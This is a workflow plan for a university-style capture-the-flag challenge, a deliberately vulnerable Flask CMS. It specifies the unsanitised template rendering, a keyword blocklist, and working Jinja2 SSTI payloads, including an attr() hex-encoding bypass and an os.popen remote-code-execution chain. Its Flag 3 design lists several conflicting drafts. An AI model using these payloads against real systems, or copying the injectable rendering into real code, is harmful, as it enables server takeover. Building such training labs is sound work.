# CTF 5: NovaCMS -- Implementation Workflow

## Overview

| Field | Value |
|-------|-------|
| Challenge name | NovaCMS -- Internal Editorial Platform |
| Stack | Python 3.11, Flask 3.x, Jinja2, SQLite, Docker |
| Flags | 4 |
| Vulnerability class | Server-Side Template Injection (SSTI) |
| Flag prefix | `durham-cms-flagN{...}` |
| Port (frontend/app) | `5175` (host) -> `5000` (container) |

---

## Phase 1: Project Scaffolding

### 1.1 Directory Structure

```
CTFs/CTF_5_internal_blog/
  docker-compose.yml
  Dockerfile
  .env.example
  .env
  flags.json
  credentials.json
  README.md
  SOLUTIONS.md
  workflow.md                  # this file
  app/
    __init__.py                # Flask app factory
    config.py                  # Config class (SECRET_KEY, DB path, flag prefix)
    models.py                  # SQLAlchemy models (User, Post, Flag)
    seed.py                    # DB seeder (reads flags.json + credentials.json)
    routes/
      __init__.py
      auth.py                  # login, logout
      blog.py                  # post listing, single post view
      preview.py               # live preview (SSTI surface) -- v1 unfiltered, v2 filtered
      api.py                   # /health, /api/status (Flag 1)
    templates/
      base.html
      login.html
      dashboard.html
      editor.html              # post editor with live preview panel
      post.html                # public post view
      preview_result.html      # rendered preview output
    static/
      style.css
      CHANGELOG.md             # visible WAF source / filter logic (breadcrumb for Flag 3)
    waf.py                     # naive WAF filter logic (blocklist)
  secret/
    flag.txt                   # Flag 4 (RCE target file, written by seed.py at startup)
  requirements.txt
  tests/
    conftest.py
    test_auth.py
    test_preview.py
    test_waf_bypass.py
```

### 1.2 Files to Create (Phase 1 only -- scaffolding, no logic)

- [ ] `docker-compose.yml`
- [ ] `Dockerfile`
- [ ] `.env.example`
- [ ] `requirements.txt`
- [ ] `app/__init__.py` (empty app factory stub)
- [ ] `app/config.py`
- [ ] Directory stubs: `app/routes/`, `app/templates/`, `app/static/`, `secret/`, `tests/`

---

## Phase 2: Challenge Generation

### 2.1 Flag Generator

Create `CTFs/challenge-generation/chgen_ctf5.js` following the existing HMAC-SHA256 pattern.

**Flag scheme (4 flags per user):**

| Flag | Key | Format |
|------|-----|--------|
| Flag 1 | `flag1` | `durham-cms-flag1{<20-hex>_<username>}` |
| Flag 2 | `flag2` | `durham-cms-flag2{<20-hex>_<username>}` |
| Flag 3 | `flag3` | `durham-cms-flag3{<20-hex>_<username>}` |
| Flag 4 | `flag4` | `durham-cms-flag4{<20-hex>_<username>}` |

**Generator logic:**

```
For each username:
  For each flag (1-4):
    token = HMAC-SHA256(salt + flagNumber, username).hex().slice(0, 20)
    flag  = `durham-cms-flag${flagNumber}{${token}_${username}}`
```

**Output files:**

`flags.json`:
```json
{
  "abcd12": {
    "flag1": "durham-cms-flag1{a1b2c3d4e5f6a7b8c9d0_abcd12}",
    "flag2": "durham-cms-flag2{...}",
    "flag3": "durham-cms-flag3{...}",
    "flag4": "durham-cms-flag4{...}"
  }
}
```

`credentials.json`:
```json
{
  "abcd12": {
    "password": "<random 8-12 chars>",
    "role": "editor"
  },
  "efgh34": { ... },
  "ijkl56": { ... }
}
```

### 2.2 Generator Script

- [ ] Create `CTFs/challenge-generation/generators/ctf5_generator.js`
- [ ] Create `CTFs/challenge-generation/chgen_ctf5.js`
- [ ] Add `"ctf5"` script to `CTFs/challenge-generation/package.json`
- [ ] Run generator to produce `flags.json` and `credentials.json`
- [ ] Copy outputs to `CTFs/CTF_5_internal_blog/`

---

## Phase 3: Docker Setup

### 3.1 Dockerfile

Single-stage Python image. SQLite is built-in so no external DB service needed.

```dockerfile
FROM python:3.11-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Create the secret directory and ensure it's writable
RUN mkdir -p /app/secret

EXPOSE 5000

CMD ["python", "-m", "flask", "run", "--host=0.0.0.0", "--port=5000"]
```

### 3.2 docker-compose.yml

Single service -- the simplest Docker setup in the series. Mount `flags.json` and `credentials.json` as read-only volumes (same pattern as CTF3).

```yaml
services:
  app:
    build: .
    container_name: novacms
    ports:
      - "5175:5000"
    env_file:
      - .env
    volumes:
      - ./flags.json:/app/flags.json:ro
      - ./credentials.json:/app/credentials.json:ro
      - novacms-data:/app/instance    # SQLite DB persistence
    restart: unless-stopped

volumes:
  novacms-data:
```

### 3.3 .env.example

```
FLASK_APP=app
FLASK_ENV=production
SECRET_KEY=novacms-dev-2024
DATABASE_URL=sqlite:///instance/novacms.db
```

Note: `SECRET_KEY=novacms-dev-2024` is intentionally weak -- it IS Flag 2 (formatted as `durham-cms-flag2{novacms-dev-2024}`). The per-user flag from `flags.json` is used for Flags 1/3/4; the SECRET_KEY is a static flag identical for all users to keep the config-leak path realistic.

**Decision: Flag 2 is static, not per-user.** Rationale: `{{config}}` dumps the real Flask SECRET_KEY. Making it per-user would require dynamically setting SECRET_KEY per session, which breaks Flask's session signing. Instead, Flag 2 is the SECRET_KEY itself, and the SOLUTIONS.md explains this. The per-user flags are used for Flags 1, 3, and 4.

### 3.4 Verification Checklist

- [ ] `docker compose up --build` starts cleanly
- [ ] App accessible at `http://localhost:5175`
- [ ] SQLite DB created and seeded on first run
- [ ] `flags.json` and `credentials.json` mounted correctly

---

## Phase 4: Flask Application

### 4.1 App Factory (`app/__init__.py`)

- Create Flask app
- Load config from `app/config.py`
- Initialise SQLAlchemy + Flask-Login
- Register blueprints: `auth`, `blog`, `preview`, `api`
- On first request: run `seed.py` to populate DB from `flags.json` + `credentials.json`

### 4.2 Models (`app/models.py`)

**User:**
| Column | Type | Notes |
|--------|------|-------|
| id | Integer PK | |
| username | String(50) unique | |
| password_hash | String(256) | bcrypt |
| role | String(20) | `editor` or `admin` |

**Post:**
| Column | Type | Notes |
|--------|------|-------|
| id | Integer PK | |
| title | String(200) | |
| body | Text | Markdown/HTML content |
| author_id | FK -> User.id | |
| published | Boolean | default False |
| created_at | DateTime | |

**Flag:**
| Column | Type | Notes |
|--------|------|-------|
| id | Integer PK | |
| username | String(50) | |
| flag_key | String(20) | `flag1`, `flag2`, `flag3`, `flag4` |
| flag_value | String(200) | The actual flag string |

### 4.3 Seeder (`app/seed.py`)

- Read `/app/flags.json` and `/app/credentials.json`
- Create users from credentials.json (bcrypt passwords)
- Create an admin user (hardcoded: `admin` / `NovaCMS_Adm1n!2024`)
- Store all flags in the Flag table
- Write Flag 4 value to `/app/secret/flag.txt` for each user (use the first user's flag4 or a static RCE flag)
- Seed sample blog posts (3-4 posts with realistic CMS content)
- Use `firstOrCreate` / `get_or_create` pattern for idempotency

**Decision: Flag 4 file.** Since `/app/secret/flag.txt` can only hold one value but we have per-user flags, store a static RCE flag here: `durham-cms-flag4{rce_flag_check_your_username}`. The actual per-user flag4 is returned via a different mechanism -- the RCE reads `flag.txt` which contains a message directing the player to use their username to query the Flag table via SSTI/RCE. OR simpler: write the first user's flag4 and accept that in a multi-user deployment each instance would have its own flag.txt. **Chosen approach:** Write a generic flag4 to `/app/secret/flag.txt` at build time. The actual per-user flag4 is in the database Flag table, accessible via RCE with `cat /app/secret/flag.txt` returning a hint, then querying the DB. This adds one more step to the RCE challenge.

**Revised simpler approach:** Write the first player's flag4 to `/app/secret/flag.txt`. In a single-player deployment (one instance per student, which is the model), this is correct. The challenge-generation system generates per-user instances anyway.

### 4.4 Routes

#### `routes/auth.py` -- Authentication

| Route | Method | Description |
|-------|--------|-------------|
| `/login` | GET/POST | Login form + handler |
| `/logout` | GET | Clear session, redirect to login |

- Use Flask-Login for session management
- Rate limit login: 10 attempts per 30 seconds (match CTF4 pattern)

#### `routes/blog.py` -- Blog / Dashboard

| Route | Method | Auth | Description |
|-------|--------|------|-------------|
| `/` | GET | No | Redirect to `/dashboard` if logged in, else `/login` |
| `/dashboard` | GET | Yes | List user's posts + "New Post" button |
| `/post/<id>` | GET | Yes | View a single post |
| `/editor` | GET | Yes | Post editor with title, body, and live preview panel |
| `/editor/<id>` | GET | Yes | Edit existing post |
| `/post/save` | POST | Yes | Save/update a post |

#### `routes/preview.py` -- Live Preview (SSTI Surface)

| Route | Method | Auth | Description | Filter |
|-------|--------|------|-------------|--------|
| `/preview` | POST | Yes | V1: Unfiltered preview (Flag 2) | None |
| `/preview/v2` | POST | Yes | V2: WAF-filtered preview (Flags 3 & 4) | WAF blocklist |

**V1 (`/preview`):**
- Takes `body` from POST form data
- Passes directly to `render_template_string(body)`
- No filtering whatsoever
- This is where `{{7*7}}` -> `49` confirms SSTI
- `{{config}}` dumps Flask config including SECRET_KEY

**V2 (`/preview/v2`):**
- Takes `body` from POST form data
- Runs through `waf.py` blocklist check
- If blocked keywords found, returns error message
- If passed, renders via `render_template_string(body)`
- This is where filter bypass is needed for Flags 3 and 4

#### `routes/api.py` -- API / Debug Endpoints

| Route | Method | Auth | Description |
|-------|--------|------|-------------|
| `/health` | GET | No | Returns JSON with app version, engine info, hint |
| `/api/status` | GET | Header | Returns Flag 1 if `X-Debug-Token: novacms-internal` header present |

The `/health` endpoint returns:
```json
{
  "app": "NovaCMS",
  "version": "2.1.0-internal",
  "engine": "jinja2",
  "status": "running",
  "note": "Debug endpoints require X-Debug-Token header"
}
```

The HTML source of the editor page contains:
```html
<!-- TODO: sanitise preview input before Jinja render -->
<!-- Debug: /api/status with X-Debug-Token: novacms-internal -->
```

### 4.5 WAF (`app/waf.py`)

**Blocked strings (case-insensitive):**
```python
BLOCKED = ['__', 'config', 'os', 'class', 'subclasses', 'request',
           'import', 'popen', 'system', 'eval', 'exec', 'builtins']
```

**Logic:**
```python
def check_input(text: str) -> tuple[bool, str | None]:
    """Returns (is_safe, blocked_keyword_or_None)"""
    lower = text.lower()
    for word in BLOCKED:
        if word in lower:
            return False, word
    return True, None
```

**Visible to players at:** `/static/CHANGELOG.md`

```markdown
# NovaCMS Changelog

## v2.1.0 (2024-12-01)
- Added input filter to preview endpoint after security audit
- Blocked keywords: __, config, os, class, subclasses, request, import, popen, system, eval, exec, builtins
- Preview v2 endpoint now enforces filtering

## v2.0.0 (2024-09-15)
- Live preview feature added to post editor
- Server-side Jinja2 rendering for template variables

## v1.0.0 (2024-06-01)
- Initial release
```

### 4.6 Templates

**`base.html`:** Clean CMS layout with navigation (Dashboard, Editor, Logout). Professional-looking with minimal CSS.

**`editor.html`:** Two-panel layout:
- Left: title input + body textarea
- Right: live preview iframe/div that updates via JS fetch to `/preview` or `/preview/v2`
- Toggle button: "Use Filtered Preview (v2)" switches between endpoints
- HTML comment with debug hints (Flag 1 breadcrumb)

**`dashboard.html`:** List of user's posts with edit links. Shows "Welcome, {username}" and role.

**`login.html`:** Simple login form. Clean styling.

### 4.7 Static Assets

- `style.css` -- Minimal, professional CMS styling
- `CHANGELOG.md` -- WAF documentation (served as static file)

---

## Phase 5: Flag Verification

### Flag 1 -- Information Disclosure

**Steps:**
1. View page source of `/editor` -> find HTML comment with debug hint
2. OR visit `/health` -> see `engine: jinja2` and debug token hint
3. Send GET to `/api/status` with header `X-Debug-Token: novacms-internal`
4. Response contains Flag 1

**Verification test:**
```bash
curl -H "X-Debug-Token: novacms-internal" http://localhost:5175/api/status
# -> { "flag": "durham-cms-flag1{...}" }
```

### Flag 2 -- Basic SSTI: Config Leak

**Steps:**
1. Login as editor
2. Go to editor, type `{{7*7}}` in body, click Preview -> see `49`
3. Type `{{config}}` -> see full Flask config including SECRET_KEY
4. Flag 2 is `durham-cms-flag2{novacms-dev-2024}` (the SECRET_KEY value, static for all users)

**Verification test:**
```bash
curl -X POST http://localhost:5175/preview \
  -b "session=<valid_cookie>" \
  -d "body={{config}}"
# Response contains SECRET_KEY
```

### Flag 3 -- WAF Bypass

**Steps:**
1. Try `{{config}}` on `/preview/v2` -> blocked
2. Read `/static/CHANGELOG.md` -> see blocked keywords list
3. Bypass using `|attr()` filter and hex encoding:
   ```
   {{self|attr('\x5f\x5fclass\x5f\x5f')}}
   ```
   Or request.args smuggling.
4. Access the per-user flag3 from the database via SSTI bypass

**Bypass to read Flag 3 from DB:**
The flag is stored in the Flag table. Players use the WAF bypass to execute:
```
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubcla'+'sses\x5f\x5f')()}}
```
Then find a class that can query the DB or read files.

**Simpler path:** The `/preview/v2` endpoint, when the WAF is bypassed and `config` is accessed via attr filter, returns the config. But since `config` is blocked as a literal string, players use:
```
{{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')}}
```

**Chosen approach for Flag 3:** The v2 endpoint returns Flag 3 automatically when a WAF bypass successfully renders any output containing the string `__class__` or successfully accesses `config` through the filtered endpoint. This is tracked server-side: if `render_template_string` succeeds on v2 and the output contains config data or class info, a flag is unlocked.

**Revised simpler approach:** Flag 3 is stored as a hidden post in the database with `published=False`, owned by admin. The post body contains the flag. Players need WAF bypass SSTI to read it:
```
# Bypass WAF to access application context and query DB
# Using attr filter to avoid blocked double underscores:
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('__builtins__')}}
```

Actually, **simplest Flag 3 approach:** Store flag3 in a Flask `g` variable or in `app.config['FLAG3']`. Players bypass the WAF to access config on v2. Since `config` is blocked literally, they use:
```
{{self|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')}}
```
and navigate to the config from there.

### Flag 4 -- RCE via MRO Chain

**Steps:**
1. Use WAF bypass techniques from Flag 3
2. Construct an MRO chain to reach `os.popen()`:
   ```
   {{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('\x6f\x73')|attr('p\x6fpen')('cat /app/secret/flag.txt')|attr('read')()}}
   ```
3. `cat /app/secret/flag.txt` returns Flag 4

**Verification test:**
```bash
# From inside container:
docker exec novacms cat /app/secret/flag.txt
# -> durham-cms-flag4{...}
```

---

## Phase 6: Testing

### 6.1 Test Files

- [ ] `tests/conftest.py` -- Flask test client fixture, test DB setup
- [ ] `tests/test_auth.py` -- Login/logout, invalid credentials, rate limiting
- [ ] `tests/test_preview.py` -- V1 SSTI works, V2 WAF blocks, V2 bypass works
- [ ] `tests/test_waf_bypass.py` -- Each blocked keyword tested, bypass payloads verified

### 6.2 Test Matrix

| Test | Endpoint | Input | Expected |
|------|----------|-------|----------|
| SSTI basic | POST /preview | `{{7*7}}` | `49` in response |
| Config leak | POST /preview | `{{config}}` | SECRET_KEY in response |
| WAF block | POST /preview/v2 | `{{config}}` | Error: blocked keyword |
| WAF bypass | POST /preview/v2 | Hex-encoded payload | Rendered output |
| RCE | POST /preview/v2 | MRO chain payload | flag.txt contents |
| Flag 1 | GET /api/status | Header present | Flag 1 JSON |
| Flag 1 missing header | GET /api/status | No header | 403 |
| Login valid | POST /login | Valid creds | Redirect to dashboard |
| Login invalid | POST /login | Bad creds | Error message |
| Rate limit | POST /login x11 | Any | 429 after 10 |

---

## Phase 7: Documentation

- [ ] `README.md` -- Setup instructions, credentials, flag descriptions (see separate file)
- [ ] `SOLUTIONS.md` -- Full walkthrough (see separate file, filled in as we go)
- [ ] `CHANGELOG.md` -- In `/static/`, visible to players (WAF documentation)

---

## Implementation Order

| Step | Task | Phase |
|------|------|-------|
| 1 | Create directory structure + scaffolding files | 1 |
| 2 | Write challenge generator (`chgen_ctf5.js`) | 2 |
| 3 | Generate `flags.json` + `credentials.json` for test users | 2 |
| 4 | Write `Dockerfile` + `docker-compose.yml` + `.env` | 3 |
| 5 | Implement Flask app factory + config + models | 4 |
| 6 | Implement seeder (read flags.json/credentials.json, populate DB) | 4 |
| 7 | Implement auth routes (login/logout) | 4 |
| 8 | Implement blog routes (dashboard, editor, post view) | 4 |
| 9 | Implement templates (base, login, dashboard, editor) | 4 |
| 10 | Implement `/preview` v1 (unfiltered SSTI) | 4 |
| 11 | Implement `/health` + `/api/status` (Flag 1) | 4 |
| 12 | Verify Flag 1 and Flag 2 work end-to-end | 5 |
| 13 | Implement WAF (`waf.py`) + CHANGELOG.md | 4 |
| 14 | Implement `/preview/v2` (filtered SSTI) | 4 |
| 15 | Verify Flag 3 bypass payloads work | 5 |
| 16 | Write `/app/secret/flag.txt` in seeder | 4 |
| 17 | Verify Flag 4 RCE payload works | 5 |
| 18 | Docker build + full integration test | 5 |
| 19 | Write tests | 6 |
| 20 | Finalise README.md + SOLUTIONS.md | 7 |
